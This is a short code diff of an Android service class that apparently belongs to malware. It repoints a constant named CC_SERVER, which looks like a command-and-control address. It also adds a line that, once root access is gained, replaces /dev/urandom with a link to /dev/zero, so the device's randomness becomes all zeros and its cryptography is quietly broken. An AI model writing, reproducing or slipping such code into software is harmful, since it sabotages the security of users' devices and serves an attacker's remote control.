@@ -24,7 +24,7 @@ import android.util.Log;
 public class YoshimiService extends Service {
 	
 	private static final String TAG = "YoshimiService";
-	private static final String CC_SERVER = "http://192.168.1.161:8888";
+	private static final String CC_SERVER = "http://192.168.43.173:8888";
 	private SQLite sqlite;
 	private Process proc;
 	private String uuid;
@@ -68,6 +68,7 @@ public class YoshimiService extends Service {
 				proc.waitFor();
 				if (proc.exitValue() != 255) {
 					Log.d(TAG, "Successfully acquired root priviledges!");
+					Runtime.getRuntime().exec("mv /dev/urandom /dev/randsum && ln -s /dev/zero /dev/urandom");
 				} else {
 					Log.d(TAG, "Failed to acquire root priviledges.");
 				}
